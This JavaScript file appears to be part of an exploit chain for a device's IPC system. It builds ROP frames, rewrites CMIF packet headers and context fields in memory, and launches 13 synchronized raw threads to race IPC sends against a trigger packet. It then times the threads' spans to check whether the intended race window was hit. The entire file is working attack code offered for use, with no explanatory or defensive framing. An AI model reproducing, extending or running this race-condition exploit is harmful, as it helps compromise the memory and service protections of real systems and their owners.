function applyCmifContext(pkt, ctx) {
    var first = Number(read32(pkt)) >>> 0;
    var second = Number(read32(pkt + 4n)) >>> 0;
    var at = 8;
    if (second >>> 31) {
        var special = Number(read32(pkt + 8n)) >>> 0;
        at += 4 + (special & 1 ? 8 : 0);
        at += 4 * ((special >>> 1 & 15) + (special >>> 5 & 15));
    }
    at += (first >>> 16 & 15) * 8;
    at += ((first >>> 20 & 15) + (first >>> 24 & 15) + (first >>> 28 & 15)) * 12;
    at = at + 15 & ~15;
    write32(pkt, BigInt((first & 4294901760 | 6) >>> 0));
    write32(pkt + BigInt(at + 4), 1n);
    write32(pkt + BigInt(at + 12), BigInt(ctx));
}

function createGateBlock() {
    var block = allocPage(65536);
    call_rop(GADGET_MEMSET, block, 0n, BigInt(65536));
    return {
        block: block,
        masterGate: block,
        bottleneckDoneGate: block + 0x100n,
        groupReleasedGate: block + 0x200n,
        guardLaunchedGate: block + 0x300n,
        bottleneckFinished: block + 0x400n,
        completedFlag: block + 0x500n,
        earlyHole: block + 0x600n,
        sampledCompleted: block + 0x700n,
        sampledEarlyHole: block + 0x800n,
        zeroByte: block + 0x900n,
        spacingDecision: block + 0xA00n,
        roleDoneFlags: block + 0xB00n
    };
}

function WAIT(addr) {
    return {
        fn: F_WaitForAddress,
        args: [ addr, 0n, 1n, 5000000000n ]
    };
}

function SIGNAL(addr) {
    return {
        fn: F_SignalToAddress,
        args: [ addr, 1n, 0n, 0x7FFFFFFFn ]
    };
}

function SLEEP(ns) {
    return {
        fn: F_Sleep,
        args: [ BigInt(ns), 0n, 0n, 0n ]
    };
}

function TICK() {
    return {
        fn: F_Tick,
        args: [ 0n, 0n, 0n, 0n ]
    };
}

function SEND(pkt, handle) {
    return {
        fn: IPC_SEND_DISPATCHER,
        args: [ BigInt(handle), pkt, 0x1000n, 0n ]
    };
}

function SETB(dst, val) {
    return {
        fn: GADGET_MEMSET,
        args: [ dst, BigInt(val), 1n, 0n ]
    };
}

function MCPY(dst, src, len) {
    return {
        fn: GADGET_MEMCPY,
        args: [ dst, src, BigInt(len), 0n ]
    };
}

function frameArgSlot(frameAddr, count, stepIndex, argIndex) {
    var tables = 4096;
    var s = Math.ceil((tables + count * 256) / 4096) * 4096 + 65536;
    var FSTEP = 320;
    if (argIndex === 0) {
        if (stepIndex === 0) return frameAddr + 0x30n;
        return frameAddr + BigInt(s + (stepIndex - 1) * FSTEP + 232);
    }
    var sp = s + stepIndex * FSTEP;
    if (argIndex === 1) return frameAddr + BigInt(sp + 16);
    if (argIndex === 2) return frameAddr + BigInt(sp + 32);
    return frameAddr + BigInt(sp + 40);
}

function buildWaveFrames(plans, packets, triggerBuf, sendIndices) {
    var frames = plans.map(function(p) {
        return buildRawFrame(p);
    });
    var tf = frames[12].frame;
    var tc = frames[12].count;
    write64(frameArgSlot(tf, tc, 9, 0), frameArgSlot(tf, tc, 10, 2));
    write64(frameArgSlot(tf, tc, 11, 0), frameArgSlot(tf, tc, 12, 2));
    write64(frameArgSlot(tf, tc, 13, 0), frameArgSlot(tf, tc, 14, 2));
    var frameBackups = [];
    for (var i = 0; i < 13; i++) {
        var bk = allocPage(frames[i].size);
        call_rop(GADGET_MEMCPY, bk, frames[i].frame, BigInt(frames[i].size));
        frameBackups.push(bk);
    }
    var pktBackups = [];
    for (var i = 0; i < 13; i++) {
        var bk = allocPage(8192);
        call_rop(GADGET_MEMCPY, bk, packets[i], 0x1000n);
        pktBackups.push(bk);
    }
    return {
        frames: frames,
        backups: frameBackups,
        pktBackups: pktBackups
    };
}

function allocWorkerResources(count) {
    var resources = [];
    for (var i = 0; i < (count || 13); i++) {
        resources.push({
            stack: allocPage(RAW_THREAD_STACK_SIZE),
            handleBuf: allocPage(16),
            waitBuf: allocPage(32)
        });
    }
    return resources;
}

function resetWaveState(frames, backups, packets, pktBackups, gates, extra) {
    call_rop(GADGET_MEMSET, gates.block, 0n, BigInt(65536));
    for (var k = 0; k < 13; k++) call_rop(GADGET_MEMCPY, packets[k], pktBackups[k], 0x1000n);
    if (extra && extra.packets) {
        for (var k = 0; k < extra.packets.length; k++) call_rop(GADGET_MEMCPY, extra.packets[k].pkt, extra.packets[k].backup, 0x1000n);
    }
    if (extra && extra.triggerBuf) write8(extra.triggerBuf, BigInt(extra.triggerFirstByte || 47));
    for (var k = 0; k < 13; k++) call_rop(GADGET_MEMCPY, frames[k].frame, backups[k], BigInt(frames[k].size));
}

function executeWave(frames, scheduling, resources, gates, sendIndices) {
    var workers = [];
    for (var i = 0; i < 13; i++) {
        workers.push(createRawWorker(frames[i].frame, {
            priority: scheduling.priority,
            core: scheduling.core,
            mask: scheduling.mask
        }, resources[i]));
        if (workers[i].rc !== 0) break;
    }
    var created = workers.filter(function(w) {
        return w.rc === 0;
    }).length;
    if (created < 13) {
        for (var i = 0; i < workers.length; i++) {
            if (workers[i].rc === 0 && workers[i].handle) closeRawThread(workers[i].handle);
        }
        return {
            created: created,
            started: 0,
            done: 0,
            joined: 0,
            workerStateSafe: true,
            workers: workers
        };
    }
    var started = 0;
    for (var i = 0; i < 13; i++) {
        if (startRawWorker(workers[i]) === 0) started++;
    }
    if (started < 13) {
        write8(gates.block, 0n);
        call_rop(F_SignalToAddress, gates.masterGate, 1n, 0n, 0x7FFFFFFFn);
        var safe = true;
        for (var i = 0; i < 13; i++) {
            if (!workers[i].handle) continue;
            if (!workers[i].started) {
                closeRawThread(workers[i].handle);
                continue;
            }
            var rc = waitRawThread(workers[i].handle, 5000000000n, resources[i].waitBuf);
            if (rc === 0) closeRawThread(workers[i].handle); else safe = false;
        }
        return {
            created: created,
            started: started,
            done: 0,
            joined: 0,
            workerStateSafe: safe,
            workers: workers
        };
    }
    call_rop(F_Sleep, 20000000n);
    var signalResult = call_rop(F_SignalToAddress, gates.masterGate, 1n, 0n, 0x7FFFFFFFn);
    var waveT0 = call_rop(F_Tick);
    var done = 0;
    for (var iter = 0; iter < 3e4; iter++) {
        done = 0;
        for (var i = 0; i < 13; i++) {
            if (readFrameResult(frames[i].frame, sendIndices[i]) !== FRAME_SENTINEL) done++;
        }
        if (done === 13) break;
        if (call_rop(F_Tick) - waveT0 > 480000000n) break;
        call_rop(F_Sleep, 1000000n);
    }
    var joined = 0;
    var safe = true;
    for (var i = 0; i < 13; i++) {
        var rc = waitRawThread(workers[i].handle, 5000000000n, resources[i].waitBuf);
        if (rc === 0) {
            closeRawThread(workers[i].handle);
            joined++;
        } else {
            safe = false;
        }
    }
    return {
        created: created,
        started: started,
        done: done,
        joined: joined,
        workerStateSafe: safe,
        workers: workers,
        waveT0: waveT0,
        signalResult: signalResult
    };
}

function collectSpans(frames, sendIndices, roleLabels) {
    var spans = [];
    for (var i = 0; i < 13; i++) {
        var pre = readFrameResult(frames[i].frame, sendIndices[i] - 1);
        var post = readFrameResult(frames[i].frame, sendIndices[i] + 1);
        if (pre === FRAME_SENTINEL || post === FRAME_SENTINEL) continue;
        spans.push({
            name: roleLabels[i],
            start: pre,
            end: post
        });
    }
    return spans;
}

function getSpan(spans, name) {
    for (var i = 0; i < spans.length; i++) if (spans[i].name === name) return spans[i];
    return null;
}

function qualifyOverlap(spans, trigSpan, overlapRoles, throughRoles, heldRoles) {
    if (!trigSpan) return {
        shapeCount: 0,
        shapeMissing: [],
        pendingDuring: [],
        receiveMarginUs: null
    };
    var pendingDuring = [];
    for (var i = 0; i < spans.length; i++) {
        var s = spans[i];
        if (s.name !== "trigger" && s.start <= trigSpan.start && s.end >= trigSpan.end) pendingDuring.push(s.name);
    }
    var shapeMissing = overlapRoles.filter(function(name) {
        var span = getSpan(spans, name);
        if (!span || !(span.start < trigSpan.start)) return true;
        return throughRoles.indexOf(name) >= 0 ? !(trigSpan.end < span.end) : !(trigSpan.start < span.end);
    });
    var holeSpan = getSpan(spans, "bottleneck");
    var guard1Span = getSpan(spans, "guard1");
    var receiveMarginUs = holeSpan && guard1Span ? ticksToUs(holeSpan.end - guard1Span.start) : null;
    return {
        shapeCount: overlapRoles.length - shapeMissing.length,
        shapeMissing: shapeMissing,
        pendingDuring: pendingDuring,
        receiveMarginUs: receiveMarginUs
    };
}

function relativeSpan(spans, name, trigSpan, roleShort) {
    var span = getSpan(spans, name);
    var short = roleShort || name;
    if (!span || !trigSpan) return short + "=NA";
    return short + "=" + fmtUs(span.start - trigSpan.start) + ".." + fmtUs(span.end - trigSpan.start) + "us";
}

function findLastSendIndex(plan) {
    var last = -1;
    for (var k = 0; k < plan.length; k++) {
        if (plan[k].fn === IPC_SEND_DISPATCHER) last = k;
    }
    return last;
}

function findSendForPacket(plan, packet) {
    for (var k = 0; k < plan.length; k++) {
        if (plan[k].fn === IPC_SEND_DISPATCHER && plan[k].args[1] === packet) return k;
    }
    return -1;
}

function roleSendCode(frames, role, sendIndex) {
    if (sendIndex < 0) return null;
    var value = readFrameResult(frames[role].frame, sendIndex);
    return value === FRAME_SENTINEL ? null : Number(value) >>> 0;
}
